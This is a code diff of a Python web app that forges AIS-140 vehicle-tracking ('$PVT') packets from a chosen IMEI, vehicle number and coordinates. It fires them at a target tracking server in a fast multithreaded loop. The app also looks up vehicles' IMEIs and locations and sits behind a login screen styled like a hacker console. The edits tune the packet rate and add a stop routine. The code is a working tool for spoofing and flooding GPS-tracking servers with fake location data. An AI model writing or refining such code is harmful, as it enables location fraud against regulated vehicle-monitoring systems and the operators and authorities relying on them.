@@ -33,9 +33,10 @@ def handshake_worker(tag, imei, vno, lat, lon):
         now = datetime.now(timezone.utc) + timedelta(hours=5, minutes=30)
         date_str = now.strftime('%d%m%Y')
         time_str = now.strftime('%H%M%S')
+        # 🔥 REAL STRING (STRICTLY UNCHANGED)
         packet = f"$PVT,{tag},1.ONTC,NR,01,L,{imei},{vno},1,{date_str},{time_str},{lat},N,{lon},E,0.0,348.79,31,0033.96,2.00,0.40,airtel,0,1,029.2,004.1,0,C,29,405,52,065d,45c2,45c1,065d,24,eeca,065d,17,bfd4,065d,17,384c,065d,16,0000,00,014722,A3270A39*\r\n"
         with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
-            s.settimeout(2)
+            s.settimeout(1.5)
             s.connect((TARGET_DOMAIN, TARGET_PORT))
             s.sendall(packet.encode())
             packet_count += 1
@@ -47,9 +48,9 @@ def nitro_firing_loop(v_up, i, lt, ln, t_up):
         for tag in target_tags:
             if stop_event.is_set(): break
             executor.submit(handshake_worker, tag, i, v_up, lt, ln)
-        time.sleep(0.05)
+        time.sleep(0.04)
 
-# --- 3. API ROUTES (STRICTLY UNCHANGED) ---
+# --- 3. API ROUTES ---
 @app.get("/init")
 async def init(v:str, i:str, lt:str, ln:str, t:str, background_tasks: BackgroundTasks):
     global packet_count
@@ -67,7 +68,13 @@ async def init(v:str, i:str, lt:str, ln:str, t:str, background_tasks: Background
 def status(): return {"c": packet_count, "f": not stop_event.is_set()}
 
 @app.get("/stop")
-def stop(): stop_event.set(); return {"ok": True}
+def stop():
+    global executor, stop_event
+    stop_event.set()
+    # 🔥 Instant Stop Logic: Cancel all queued packets
+    executor.shutdown(wait=False, cancel_futures=True)
+    executor = ThreadPoolExecutor(max_workers=25)
+    return {"ok": True}
 
 @app.get("/fetch_data")
 async def fetch_api(vno: str):
@@ -77,7 +84,7 @@ async def fetch_api(vno: str):
         if data: return {"found": True, "imei": data.get('IMEI_No'), "lat": data.get('Lat'), "lon": data.get('Lon')}
     return {"found": False}
 
-# --- 4. UI (CENTERED ALIGNMENT & POPUP FIX) ---
+# --- 4. UI (POPUP & CENTERED ALIGNMENT) ---
 @app.get("/", response_class=HTMLResponse)
 async def home():
     return """
@@ -87,7 +94,7 @@ async def home():
     <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
     <style>
         * { box-sizing: border-box; }
-        body { background:#000; color:#0f0; font-family:monospace; margin:0; display:flex; flex-direction:column; align-items:center; min-height:100vh; overflow-x: hidden; }
+        body { background:#000; color:#0f0; font-family:monospace; margin:0; display:flex; flex-direction:column; align-items:center; min-height:100vh; overflow-x:hidden; }
         .login-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; z-index: 999; display: flex; flex-direction: column; justify-content: center; align-items: center; padding: 20px; }
         .login-box { width: 100%; max-width: 350px; border: 2px solid #0f0; padding: 30px; border-radius: 15px; box-shadow: 0 0 20px #0f0; text-align: center; }
         .popup-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); z-index: 1000; display: none; justify-content: center; align-items: center; }
@@ -116,7 +123,7 @@ async def home():
 
     <div id="loginPage" class="login-overlay">
         <div class="login-box">
-            <h2 style="color:#0f0; letter-spacing:3px;">SYSTEM LOGIN</h2>
+            <h2 style="color:#0f0; letter-spacing:3px;">GHOP-GHOP LOGIN</h2>
             <input type="text" id="l_mob" placeholder="MOBILE NUMBER">
             <input type="password" id="l_pass" placeholder="PASSWORD">
             <div class="center-row">
@@ -143,7 +150,7 @@ async def home():
             <input type="text" id="v" onblur="smartFetch()" placeholder="VEHICLE NUMBER">
             <input type="text" id="i" placeholder="IMEI">
             <div style="display:flex;gap:5px;"><input type="text" id="lt" placeholder="LAT"><input type="text" id="ln" placeholder="LON"></div>
-            <select id="tagSel"><option value="ALL">ALL TAGS (AIS-140)</option>""" + "".join([f'<option value="{t}">{t}</option>' for t in TAGS]) + """</select>
+            <select id="tagSel"><option value="ALL">AUTO</option>""" + "".join([f'<option value="{t}">{t}</option>' for t in TAGS]) + """</select>
             
             <div class="center-row">
                 <input type="checkbox" id="useDef"> <label for="useDef" style="cursor:pointer;">Default Location</label>
@@ -188,7 +195,6 @@ async def home():
                     document.getElementById('loginPage').style.display = 'none';
                     document.getElementById('mainUI').style.display = 'block';
                     
-                    // DB PATH FIX: app_config/broadcast/text
                     fetch(`${DB}/app_config/broadcast.json`).then(r=>r.json()).then(s=>{
                         if(s && s.text) {
                             document.getElementById('bcMsg').innerText = s.text;
@@ -220,10 +226,8 @@ async def home():
                         document.getElementById('a_total').innerText = (ad.ok||0)+(ad.fail||0)+(ad.error||0);
                     }
                 });
-                // DB PATH FIX: user_messages/MOBILE/text
                 fetch(`${DB}/user_messages/${currentUser}.json`).then(r=>r.json()).then(s=>{ 
                     if(s && s.text) document.getElementById('adminMsg').innerText = s.text; 
-                    else document.getElementById('adminMsg').innerText = "SYSTEM SECURE";
                 });
             }, 2500);
         }
